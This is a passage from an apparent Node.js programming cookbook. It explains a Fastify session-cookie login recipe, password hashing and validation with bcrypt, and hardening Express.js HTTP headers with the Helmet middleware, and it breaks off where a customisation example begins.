   <h2 id="_idParaDest-279">
    <a id="_idTextAnchor286">
    </a>
    
     How it works…
    
   </h2>
   <p>
    
     In this recipe, we built a
    
    <a id="_idIndexMarker699">
    </a>
    
     login system using the
    
    <strong class="source-inline">
     
      @fastify/cookie
     
    </strong>
    
     and
    
    <strong class="source-inline">
     
      @
     
    </strong>
    
     <strong class="source-inline">
      
       fastify/session
      
     </strong>
    
    
     
      modules.
     
    
   </p>
   <p>
    
     First, we imported and registered the
    
    <strong class="source-inline">
     
      @fastify/session
     
    </strong>
    
     plugin in the Fastify application (in the
    
    <strong class="source-inline">
     
      server.js
     
    </strong>
    
     file).
    
    
     This plugin injects a session object into every request object.
    
    
     Before the user is authenticated, the session value will be an
    
    
     
      empty object.
     
    
   </p>
   <p>
    
     When registering the
    
    <strong class="source-inline">
     
      @fastify/session
     
    </strong>
    
     plugin, we provided the following
    
    
     
      configuration options:
     
    
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      
       Secret
      
     </strong>
     
      : Used to sign the session ID cookie, ensuring its integrity and preventing tampering.
     
     
      It must be at least 32 characters long
     
     
      
       for security.
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       Cookie.httpOnly
      
     </strong>
     
      : Configures the session cookie.
     
     
      Note that
     
     <strong class="source-inline">
      
       httpOnly: true
      
     </strong>
     
      makes the cookie inaccessible to client-side JavaScript,
     
     
      
       enhancing security.
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       SaveUninitialized
      
     </strong>
     
      : Prevents saving unmodified sessions to the store, reducing storage usage and
     
     
      
       improving performance.
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       Resave
      
     </strong>
     
      : Prevents resaving unchanged sessions, reducing unnecessary write operations to the
     
     
      
       session store.
      
     
    </li>
   </ul>
   <p>
    
     The full list of configuration options is available in the
    
    <strong class="source-inline">
     
      @fastify/session
     
    </strong>
    
     API documentation
    
    
     
      at
     
    
    <a href="https://github.com/fastify/session?tab=readme-ov-file#api">
     
      
       https://github.com/fastify/session?tab=readme-ov-file#api
      
     
    </a>
    
     
      .
     
    
   </p>
   <p>
    
     In this recipe’s demo application, the login hyperlink on the web page redirects the user to the
    
    <strong class="source-inline">
     
      /auth/login
     
    </strong>
    
     endpoint.
    
    
     The route handler for this endpoint was declared in a separate authentication router (
    
    <strong class="source-inline">
     
      routes/auth.js
     
    </strong>
    
     ).
    
    
     This route renders the
    
    <strong class="source-inline">
     
      views/login.ejs
     
    </strong>
    
     template, which contains the HTML
    
    
     
      login form.
     
    
   </p>
   <p>
    
     When the user enters their username and password in the form and clicks
    
    <strong class="bold">
     
      Submit
     
    </strong>
    
     , the browser encodes the values and sets them as the request body.
    
    
     Our HTML form had its method set to HTTP
    
    <strong class="source-inline">
     
      POST
     
    </strong>
    
     (
    
    <strong class="source-inline">
     
      method="post"
     
    </strong>
    
     ), which instructs the browser to send an HTTP
    
    <strong class="source-inline">
     
      POST
     
    </strong>
    
     request when the form is submitted.
    
    
     The
    
    <strong class="source-inline">
     
      action
     
    </strong>
    
     attribute in our HTML form was set to
    
    <strong class="source-inline">
     
      login
     
    </strong>
    
     , which instructs the browser that the HTTP
    
    <strong class="source-inline">
     
      POST
     
    </strong>
    
     request should be sent to the
    
    <strong class="source-inline">
     
      /
     
    </strong>
    
     <strong class="source-inline">
      
       auth/login
      
     </strong>
    
    
     
      endpoint.
     
    
   </p>
   <p>
    
     In
    
    <strong class="source-inline">
     
      routes/auth.js
     
    </strong>
    
     , we registered a handler for HTTP
    
    <strong class="source-inline">
     
      POST
     
    </strong>
    
     requests to the
    
    <strong class="source-inline">
     
      /login
     
    </strong>
    
     endpoint.
    
    
     This handler extracts the username and password from the request body and checks whether they match any user in our hardcoded array of users.
    
    
     If the credentials are valid, it saves the user information in the session and renders the
    
    <strong class="source-inline">
     
      index.ejs
     
    </strong>
    
     template
    
    <a id="_idIndexMarker700">
    </a>
    
     with the
    
    
     
      user data.
     
    
   </p>
   <p>
    
     If the username and password don’t match, our HTTP
    
    <strong class="source-inline">
     
      POST
     
    </strong>
    <strong class="source-inline">
     
      /auth/login
     
    </strong>
    
     route handler renders the
    
    <strong class="source-inline">
     
      views/login.ejs
     
    </strong>
    
     template with the
    
    <strong class="source-inline">
     
      { fail : true }
     
    </strong>
    
     value.
    
    
     This instructs the
    
    <strong class="source-inline">
     
      views/login.ejs
     
    </strong>
    
     template to render the
    
    <strong class="bold">
     
      Login
     
    </strong>
    
     <strong class="bold">
      
       Failed.
      
     </strong>
    
    
     
      message.
     
    
   </p>
   <p class="callout-heading">
    
     Important note
    
   </p>
   <p class="callout">
    
     Don’t store passwords in plain text in production applications!
    
    
     You’d typically validate the supplied username and password against credentials stored in a secure database, with the password being stored in a hashed form.
    
    
     Refer to the
    
    <em class="italic">
     
      There’s more…
     
    </em>
    
     section of this recipe on hashing
    
    
     
      with
     
    
    
     <strong class="source-inline">
      
       bcrypt
      
     </strong>
    
    
     
      .
     
    
   </p>
   <p>
    
     When the authentication process is successful, we set the
    
    <strong class="source-inline">
     
      req.session.user
     
    </strong>
    
     value to the supplied username and redirect the authenticated user back to the
    
    <strong class="source-inline">
     
      /
     
    </strong>
    
     endpoint.
    
    
     At this point, the
    
    <strong class="source-inline">
     
      @fastify/session
     
    </strong>
    
     middleware creates a session identifier and sets the
    
    <strong class="source-inline">
     
      Set-Cookie
     
    </strong>
    
     HTTP header on the request.
    
    
     The
    
    <strong class="source-inline">
     
      Set-Cookie
     
    </strong>
    
     header is set to the session key name and
    
    
     
      session identifier.
     
    
   </p>
   <p>
    
     The
    
    <strong class="source-inline">
     
      @fastify/session
     
    </strong>
    
     plugin defaults to using an in-process storage mechanism to store the session tokens.
    
    
     However, these tokens are not expired, which means our process will continue to be populated with more and more tokens.
    
    
     This could eventually result in degraded performance or crash our process.
    
    
     Again, in production, you’d typically use a session store.
    
    
     The
    
    <strong class="source-inline">
     
      @fastify/session
     
    </strong>
    
     plugin is based on the
    
    <strong class="source-inline">
     
      express-session
     
    </strong>
    
     list of compatible session stores
    
    
     
      at
     
    
    <a href="https://github.com/expressjs/session#compatible-session-stores">
     
      
       https://github.com/expressjs/session#compatible-session-stores
      
     
    </a>
    
     
      .
     
    
   </p>
   <p>
    
     When the request is redirected to
    
    <strong class="source-inline">
     
      /
     
    </strong>
    
     , it now has the
    
    <strong class="source-inline">
     
      Set-Cookie
     
    </strong>
    
     HTTP header set.
    
    
     The
    
    <strong class="source-inline">
     
      @fastify/session
     
    </strong>
    
     middleware recognizes the session key name and extracts the session identifier.
    
    
     From this identifier,
    
    <strong class="source-inline">
     
      @fastify/session
     
    </strong>
    
     can query session storage for any associated state.
    
    
     In this case, the state is the user object that we assign to the
    
    <strong class="source-inline">
     
      req.session
     
    </strong>
    
     object
    
    
     
      in
     
    
    
     <strong class="source-inline">
      
       auth.js
      
     </strong>
    
    
     
      .
     
    
   </p>
   <p>
    
     The
    
    <strong class="source-inline">
     
      req.session.user
     
    </strong>
    
     value is passed through to the updated
    
    <strong class="source-inline">
     
      views/index.ejs
     
    </strong>
    
     template.
    
    
     This template contains logic such that when a
    
    <strong class="source-inline">
     
      req.session.user
     
    </strong>
    
     value is present, it will render the
    
    <strong class="source-inline">
     
      Hello beth!
     
    </strong>
    
     string.
    
    
     The logic in the template also switches between showing the
    
    <strong class="bold">
     
      Login
     
    </strong>
    
     or
    
    <strong class="bold">
     
      Logout
     
    </strong>
    
     link, depending on whether the user
    
    
     
      is authenticated.
     
    
   </p>
   <p>
    
     Clicking
    
    <strong class="bold">
     
      Logout
     
    </strong>
    
     sends an HTTP
    
    <strong class="source-inline">
     
      GET
     
    </strong>
    
     request to the
    
    <strong class="source-inline">
     
      /auth/logout
     
    </strong>
    
     endpoint.
    
    
     This endpoint sets
    
    <strong class="source-inline">
     
      req.session
     
    </strong>
    
     to
    
    <strong class="source-inline">
     
      null
     
    </strong>
    
     , which ends the session and removes session data from the session store.
    
    
     Our browser may continue to store and send the invalid session cookie until it
    
    <a id="_idIndexMarker701">
    </a>
    
     expires, but with no valid match in the session store, the server will ignore the session and consider the
    
    
     
      user unauthenticated.
     
    
   </p>
   <h2 id="_idParaDest-280">
    <a id="_idTextAnchor287">
    </a>
    
     There’s more…
    
   </h2>
   <p>
    
     The following sections will cover secure session cookies and a simple example of how to hash
    
    
     
      a password.
     
    
   </p>
   <h3>
    
     Secure session cookies
    
   </h3>
   <p>
    
     Session cookies can
    
    <a id="_idIndexMarker702">
    </a>
    
     be marked with a
    
    <strong class="source-inline">
     
      Secure
     
    </strong>
    
     attribute.
    
    
     The
    
    <strong class="source-inline">
     
      Secure
     
    </strong>
    
     attribute forces the browser to not use HTTP to send cookies back to the server.
    
    
     This is to avoid
    
    <strong class="bold">
     
      man-in-the-middle
     
    </strong>
    
     (
    
    <strong class="bold">
     
      MITM
     
    </strong>
    
     ) attacks.
    
    
     In
    
    <a id="_idIndexMarker703">
    </a>
    
     production applications, HTTPS and secure cookies should be used.
    
    
     But in development, it’s easier to
    
    
     
      use HTTP.
     
    
   </p>
   <p>
    
     It’s typical for a production environment to apply SSL encryption at the load balancer layer.
    
    
     A load balancer is a technology in an application architecture that’s responsible for boosting the efficiency of the application by distributing a set of tasks over a set of resources – for example, distributing login requests
    
    
     
      to servers.
     
    
   </p>
   <p>
    
     We can configure our Fastify server to communicate with a load balancer over HTTP but still support
    
    <strong class="source-inline">
     
      Secure
     
    </strong>
    
     cookies using the appropriate cookie settings.
    
    
     In production, the
    
    <strong class="source-inline">
     
      Secure
     
    </strong>
    
     option for
    
    <a id="_idIndexMarker704">
    </a>
    
     cookies should be set
    
    
     
      to true.
     
    
   </p>
   <h3>
    
     Hashing with bcrypt
    
   </h3>
   <p>
    
     Passwords should
    
    <a id="_idIndexMarker705">
    </a>
    
     never be stored in plain text and should instead be stored in a hashed form.
    
    
     Passwords are transformed into a hashed form
    
    <a id="_idIndexMarker706">
    </a>
    
     using a
    
    <strong class="bold">
     
      hashing function
     
    </strong>
    
     .
    
    
     Hashing functions use an algorithm to transform a value into unrecognizable data.
    
    
     The transformation is one-way, meaning it’s unlikely to be possible to determine the value from the hash.
    
    
     A website will validate a user’s password input by applying the hashing function to the supplied password and comparing it to the
    
    
     
      stored hash.
     
    
   </p>
   <p>
    
     Hashing is typically combined with a technique
    
    <a id="_idIndexMarker707">
    </a>
    
     called
    
    <strong class="bold">
     
      salting
     
    </strong>
    
     .
    
    
     Salting is where a unique value, referred to as the
    
    <em class="italic">
     
      salt
     
    </em>
    
     , is appended to the password before the hash is generated.
    
    
     This helps to protect against brute-force attacks and makes it more difficult to crack
    
    
     
      the password.
     
    
   </p>
   <p>
    <strong class="source-inline">
     
      bcrypt
     
    </strong>
    
     (
    
    <a href="https://www.npmjs.com/package/bcrypt">
     
      https://www.npmjs.com/package/bcrypt
     
    </a>
    
     ) is a
    
    <a id="_idIndexMarker708">
    </a>
    
     popular module that’s used to hash passwords in Node.js.
    
    
     The following example demonstrates how to generate a hash with a salt using the
    
    
     <strong class="source-inline">
      
       bcrypt
      
     </strong>
    
    
     
      module:
     
    
   </p>
   <ol>
    <li>
     
      First, create and initialize a directory
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        hashing-with-bcrypt
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ mkdir hashing-with-bcrypt</strong>
<strong class="bold">$ cd hashing-with-bcrypt</strong>
<strong class="bold">$ npm init --yes</strong>
<strong class="bold">$ touch hash.js validate-password.js</strong></pre>
    </li>
    <li>
     
      Next, install the
     
     
      <strong class="source-inline">
       
        bcrypt
       
      </strong>
     
     
      
       module:
      
     
     <pre class="source-code">
<strong class="bold">$ npm install bcrypt</strong></pre>
    </li>
    <li>
     
      Our program will expect the password to be supplied as an argument.
     
     
      Add the following to
     
     <strong class="source-inline">
      
       hash.js
      
     </strong>
     
      to extract the
     
     
      
       argument value:
      
     
     <pre class="source-code">
const password = process.argv[2];</pre>
    </li>
    <li>
     
      Next, in
     
     <strong class="source-inline">
      
       hash.js
      
     </strong>
     
      , import the
     
     
      <strong class="source-inline">
       
        bcrypt
       
      </strong>
     
     
      
       module:
      
     
     <pre class="source-code">
const bcrypt = require('bcrypt');</pre>
    </li>
    <li>
     
      Now, we must define the number of salt rounds.
     
     
      Here,
     
     <strong class="source-inline">
      
       bcrypt
      
     </strong>
     
      will generate a salt using the specified number of rounds.
     
     
      The higher the number of rounds, the more secure the hash will be.
     
     
      However, it will also take longer to generate and validate the hash in your application.
     
     
      In this example, we’ll set the number of salt rounds
     
     
      
       to
      
     
     
      <strong class="source-inline">
       
        10
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
const saltRounds = 10;</pre>
    </li>
    <li>
     
      Next, we need to call the
     
     <strong class="source-inline">
      
       bcrypt
      
     </strong>
     
      module’s
     
     <strong class="source-inline">
      
       hash()
      
     </strong>
     
      method.
     
     
      We supply this method with the plain text password, the number of salt rounds, and the callback function to
     
     <a id="_idIndexMarker709">
     </a>
     
      be executed once the hash has been generated.
     
     
      Our callback will output the hashed form of the password using
     
     <strong class="source-inline">
      
       conosle.log()
      
     </strong>
     
      .
     
     
      Add the following
     
     
      
       to
      
     
     
      <strong class="source-inline">
       
        hash.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
bcrypt.hash(password, saltRounds, (err, hash) =&gt; {
  if (err) {
    console.error('Error hashing password:', err);
    process.exit(1);
  } else {
    console.log(hash);
  }
});</pre>
     <p class="list-inset">
      
       In a real application, you’d expect to include your logic to persist the hash to a database within the
      
      
       
        callback function.
       
      
     </p>
    </li>
    <li>
     
      Run the program with the following command.
     
     
      You should expect a unique hash to
     
     
      
       be generated:
      
     
     <pre class="source-code">
<strong class="bold">$ node hash.js 'badpassword'</strong>
<strong class="bold">$2b$10$7/156fF/0lyqzB2pxHQJE.czJj5xZjN3N8jofXUxXi.UG5X3KAzDO</strong></pre>
     <p class="list-inset">
      
       Each time this script is run, a new unique hash will
      
      
       
        be generated.
       
      
     </p>
    </li>
    <li>
     
      Next, let’s learn how we can validate the password.
     
     
      We’ll create a program that expects both the password and the hash as arguments.
     
     
      The program will compare the
     
     <a id="_idIndexMarker710">
     </a>
     
      password and hash using the
     
     
      <strong class="source-inline">
       
        bcrypt.compare()
       
      </strong>
     
     
      
       method:
      
     
     <pre class="source-code">
const password = process.argv[2];
const hash = process.argv[3];
const bcrypt = require('bcrypt');
bcrypt
  .compare(password, hash)
  .then((res) =&gt; {
    console.log(res);
  })
  .catch((err) =&gt; console.error(err.message));</pre>
     <p class="list-inset">
      
       Note that
      
      <strong class="source-inline">
       
        res
       
      </strong>
      
       will be
      
      <strong class="source-inline">
       
        true
       
      </strong>
      
       when the password and hash match and
      
      <strong class="source-inline">
       
        false
       
      </strong>
      
       when
      
      
       
        they don’t.
       
      
     </p>
    </li>
    <li>
     
      Run the
     
     <strong class="source-inline">
      
       validate-password.js
      
     </strong>
     
      program.
     
     
      The first argument should be the same password you supplied to the
     
     <strong class="source-inline">
      
       hash.js
      
     </strong>
     
      program.
     
     
      The second argument should be the hash that your
     
     <strong class="source-inline">
      
       hash.js
      
     </strong>
     
      
       program created:
      
     
     <pre class="source-code">
<strong class="bold">$ node validate-password.js 'badpassword' '$2b$10$7/156fF/0lyqzB2pxHQJE.czJj5xZjN3N8jofXUxXi.UG5X3KAzDO'</strong>
true</pre>
     <p class="list-inset">
      
       Note that the argument values should be wrapped in single quotes to ensure the literal values
      
      
       
        are preserved.
       
      
     </p>
    </li>
   </ol>
   <p>
    
     This demonstrates
    
    <a id="_idIndexMarker711">
    </a>
    
     how we can use the
    
    <strong class="source-inline">
     
      bcrypt
     
    </strong>
    
     module to create a hash, as well as how to validate a value against an
    
    
     
      existing hash.
     
    
   </p>
   <h2 id="_idParaDest-281">
    <a id="_idTextAnchor288">
    </a>
    
     See also
    
   </h2>
   <ul>
    <li>
     
      The
     
     <em class="italic">
      
       Implementing authentication with hooks
      
     </em>
     
      recipe in
     
     <a href="B19212_06.xhtml#_idTextAnchor178">
      
       <em class="italic">
        
         Chapter 6
        
       </em>
      
     </a>
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Guarding against cross-site scripting
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Preventing cross-site request forgery
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
   </ul>
   <h1 id="_idParaDest-282">
    <a id="_idTextAnchor289">
    </a>
    
     Hardening headers with Helmet
    
   </h1>
   <p>
    
     Express.js is a lightweight
    
    <a id="_idIndexMarker712">
    </a>
    
     web framework, so certain measures that are typically taken to better secure applications are not implemented by the core framework.
    
    
     One of the precautionary measures we can take is to set certain security-related HTTP headers on requests.
    
    
     Sometimes, this is referred to as
    
    <em class="italic">
     
      hardening
     
    </em>
    
     the headers of our
    
    
     
      HTTP requests.
     
    
   </p>
   <p>
    
     The
    
    <strong class="bold">
     
      Helmet
     
    </strong>
    
     module (
    
    <a href="https://github.com/helmetjs/helmet">
     
      https://github.com/helmetjs/helmet
     
    </a>
    
     ) provides a middleware to set security-related
    
    <a id="_idIndexMarker713">
    </a>
    
     headers on our HTTP requests, saving time on manual configuration.
    
    
     Helmet sets HTTP headers to reasonable and secure defaults, which can then be extended or customized as needed.
    
    
     In this recipe, we’ll learn how to use the
    
    
     
      Helmet module.
     
    
   </p>
   <h2 id="_idParaDest-283">
    <a id="_idTextAnchor290">
    </a>
    
     Getting ready
    
   </h2>
   <p>
    
     We’ll be extending an Express.js application so that it can use the Helmet module.
    
    
     So, first, we must create a basic
    
    
     
      Express.js server:
     
    
   </p>
   <ol>
    <li>
     
      Create a directory named
     
     <strong class="source-inline">
      
       express-helmet
      
     </strong>
     
      and initialize the project with
     
     <strong class="source-inline">
      
       npm
      
     </strong>
     
      .
     
     
      We’ll also install the
     
     
      <strong class="source-inline">
       
        express
       
      </strong>
     
     
      
       module:
      
     
     <pre class="source-code">
<strong class="bold">$ mkdir express-helmet</strong>
<strong class="bold">$ cd express-helmet</strong>
<strong class="bold">$ npm init --yes</strong>
<strong class="bold">$ npm install express</strong></pre>
    </li>
    <li>
     
      Create a file
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ touch server.js</strong></pre>
    </li>
    <li>
     
      Add the following code
     
     
      
       to
      
     
     
      <strong class="source-inline">
       
        server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
const express = require('express');
const app = express();
app.get('/', (req, res) =&gt; res.send('Hello World!'));
app.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</pre>
    </li>
   </ol>
   <p>
    
     Now that we’ve
    
    <a id="_idIndexMarker714">
    </a>
    
     created our base Express.js application, we’re ready to move on to the steps to complete
    
    
     
      this recipe.
     
    
   </p>
   <h2 id="_idParaDest-284">
    <a id="_idTextAnchor291">
    </a>
    
     How to do it…
    
   </h2>
   <p>
    
     In this recipe, we’re going to learn how to use the Helmet module to harden the HTTP headers of our
    
    
     
      Express.js application:
     
    
   </p>
   <ol>
    <li>
     
      First, start the Express.js
     
     
      
       web server:
      
     
     <pre class="source-code">
<strong class="bold">$ node server.js</strong></pre>
    </li>
    <li>
     
      Now, let’s inspect the headers that our Express.js application returns.
     
     
      We can do this using the
     
     <em class="italic">
      
       cURL
      
     </em>
     
      tool.
     
     
      In a second terminal window, enter the
     
     
      
       following command:
      
     
     <pre class="source-code">
<strong class="bold">$ curl -I http://localhost:3000</strong></pre>
    </li>
    <li>
     
      You should see a response similar to the following that lists the HTTP headers returned on
     
     
      
       the request:
      
     
     <pre class="source-code">
<strong class="bold">HTTP/1.1 200 OK</strong>
<strong class="bold">X-Powered-By: Express</strong>
<strong class="bold">Content-Type: text/html; charset=utf-8</strong>
<strong class="bold">Content-Length: 12</strong>
<strong class="bold">ETag: W/"c-Lve95gjOVATpfV8EL5X4nxwjKHE"</strong>
<strong class="bold">Date: Mon, 01 Jul 2024 02:19:46 GMT</strong>
<strong class="bold">Connection: keep-alive</strong>
<strong class="bold">Keep-Alive: timeout=5</strong></pre>
     <p class="list-inset">
      
       Note the
      
      <strong class="source-inline">
       
        X-Powered-By:
       
      </strong>
      
       <strong class="source-inline">
        
         Express
        
       </strong>
      
      
       
        header.
       
      
     </p>
    </li>
    <li>
     
      Now, let’s start hardening these headers with the
     
     <strong class="source-inline">
      
       helmet
      
     </strong>
     
      module.
     
     
      Install the
     
     <strong class="source-inline">
      
       helmet
      
     </strong>
     
      module with the
     
     
      
       following command:
      
     
     <pre class="source-code">
<strong class="bold">$ npm install helmet</strong></pre>
    </li>
    <li>
     
      We need to import the
     
     <strong class="source-inline">
      
       helmet
      
     </strong>
     
      middleware in the
     
     <strong class="source-inline">
      
       app.js
      
     </strong>
     
      file.
     
     
      Do this by adding the
     
     <a id="_idIndexMarker715">
     </a>
     
      following line just below the
     
     
      <strong class="source-inline">
       
        express
       
      </strong>
     
     
      
       import:
      
     
     <pre class="source-code">
const helmet = require('helmet');</pre>
    </li>
    <li>
     
      Next, we need to instruct the Express.js application to use the
     
     <strong class="source-inline">
      
       helmet
      
     </strong>
     
      middleware.
     
     
      Below the
     
     <strong class="source-inline">
      
       const app = express();
      
     </strong>
     
      line, add
     
     
      
       the following:
      
     
     <pre class="source-code">
app.use(helmet());</pre>
    </li>
    <li>
     
      Now, restart
     
     
      
       the server:
      
     
     <pre class="source-code">
<strong class="bold">$ node server.js</strong></pre>
    </li>
    <li>
     
      Send the
     
     <em class="italic">
      
       cURL
      
     </em>
     
      
       request again:
      
     
     <pre class="source-code">
<strong class="bold">$ curl -I http://localhost:3000</strong></pre>
    </li>
    <li>
     
      At this point, we can
     
     <a id="_idIndexMarker716">
     </a>
     
      see that many additional headers are returned on
     
     
      
       the request:
      
     
     <pre class="source-code">
<strong class="bold">HTTP/1.1 200 OK</strong>
<strong class="bold">Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests</strong>
<strong class="bold">Cross-Origin-Opener-Policy: same-origin</strong>
<strong class="bold">Cross-Origin-Resource-Policy: same-origin</strong>
<strong class="bold">Origin-Agent-Cluster: ?1</strong>
<strong class="bold">Referrer-Policy: no-referrer</strong>
<strong class="bold">Strict-Transport-Security: max-age=15552000; includeSubDomains</strong>
<strong class="bold">X-Content-Type-Options: nosniff</strong>
<strong class="bold">X-DNS-Prefetch-Control: off</strong>
<strong class="bold">X-Download-Options: noopen</strong>
<strong class="bold">X-Frame-Options: SAMEORIGIN</strong>
<strong class="bold">X-Permitted-Cross-Domain-Policies: none</strong>
<strong class="bold">X-XSS-Protection: 0</strong>
<strong class="bold">Content-Type: text/html; charset=utf-8</strong>
<strong class="bold">Content-Length: 12</strong>
<strong class="bold">ETag: W/"c-Lve95gjOVATpfV8EL5X4nxwjKHE"</strong>
<strong class="bold">Date: Mon, 01 Jul 2024 02:21:22 GMT</strong>
<strong class="bold">Connection: keep-alive</strong>
<strong class="bold">Keep-Alive: timeout=5</strong></pre>
     <p class="list-inset">
      
       Note that the
      
      <strong class="source-inline">
       
        X-Powered-By
       
      </strong>
      
       header has
      
      
       
        been removed.
       
      
     </p>
    </li>
   </ol>
   <p>
    
     With that, we’ve added the
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     middleware to our Express.js server and observed the changes it makes to the HTTP headers returned from
    
    
     
      our request.
     
    
   </p>
   <h2 id="_idParaDest-285">
    <a id="_idTextAnchor292">
    </a>
    
     How it works…
    
   </h2>
   <p>
    
     The
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     module configures some of the HTTP headers on our requests based on its security defaults.
    
    
     In this recipe, we applied the
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     middleware to our
    
    
     
      Express.js server.
     
    
   </p>
   <p>
    
     The
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     module removes the
    
    <strong class="source-inline">
     
      X-Powered-By: Express
     
    </strong>
    
     header so that discovering the server is Express-based becomes more difficult.
    
    
     The reason that we’ve obfuscated this is to protect against attackers trying to exploit Express.js-oriented security vulnerabilities, slowing them down in determining the type of server being used in
    
    
     
      the application.
     
    
   </p>
   <p>
    
     At this point,
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     injects
    
    <a id="_idIndexMarker717">
    </a>
    
     the following headers into our request, along with the
    
    
     
      appropriate defaults:
     
    
   </p>
   <table class="No-Table-Style _idGenTablePara-1" id="table001-5">
    <colgroup>
     <col/>
     <col/>
    </colgroup>
    <tbody>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="bold">
          
           Header
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         <strong class="bold">
          
           Description
          
         </strong>
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           Content-Security-Policy
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Helps mitigate against XSS attacks by allowing a policy to be defined that can control which resources the user agent is allowed
        
        
         
          to load
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           Cross-Origin-Opener-Policy
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Ensures that a top-level document can only interact with documents from the
        
        
         
          same origin
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           Cross-Origin-Resource-Policy
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Restricts resources so that they can only be accessed by
        
        
         
          same-origin documents
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           Origin-Agent-Cluster
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Ensures a document is isolated in a separate agent cluster to prevent data leaks between
        
        
         
          different origins
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           Referrer-Policy
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Controls how much referrer information is included with requests sent from
        
        
         
          a site
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           Strict-Transport-Security
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Instructs browsers to only allow the website to be accessed
        
        
         
          using HTTPS
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           X-Content-Type-Options
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Indicates that the MIME types configured in the
        
        <strong class="source-inline">
         
          Content-Type
         
        </strong>
        
         headers must be
        
        
         
          adhered to
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           X-DNS-Prefetch-Control
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Controls
        
        
         
          DNS prefetching
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           X-Download-Options
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Disables the option to open a file
        
        
         
          on download
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           X-Frame-Options
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Indicates whether a browser can render a page in a
        
        <strong class="source-inline">
         
          &lt;frame&gt;
         
        </strong>
        
         ,
        
        <strong class="source-inline">
         
          &lt;iframe&gt;
         
        </strong>
        
         ,
        
        <strong class="source-inline">
         
          &lt;embed&gt;
         
        </strong>
        
         , or
        
        <strong class="source-inline">
         
          &lt;object&gt;
         
        </strong>
        
         
          HTML element
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           X-Permitted-Cross-Domain-Policies
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Instructs the browser on how to handle requests over
        
        
         
          a cross-domain
         
        
       </p>
      </td>
     </tr>
     <tr class="No-Table-Style">
      <td class="No-Table-Style">
       <p>
        
         <strong class="source-inline">
          
           X-XSS-Protection
          
         </strong>
        
       </p>
      </td>
      <td class="No-Table-Style">
       <p>
        
         Instructs the browser to stop page loading when a reflected XSS attack
        
        
         
          is detected
         
        
       </p>
      </td>
     </tr>
    </tbody>
   </table>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Table 9.1: HTTP headers injected by Helmet and their use
    
   </p>
   <p>
    
     The
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     module sets the injected HTTP headers to sensible secure defaults.
    
    
     However, they can be
    
    <a id="_idIndexMarker718">
    </a>
    
     customized.
    
    
     For example, you could manually set the value of
    
    <strong class="source-inline">
     
      Referrer-Policy
     
    </strong>
    
     to the
    
    <strong class="source-inline">
     
      no-referrer
     
    </strong>
    
     header using the
    
    
     
      following code:
     
    
   </p>
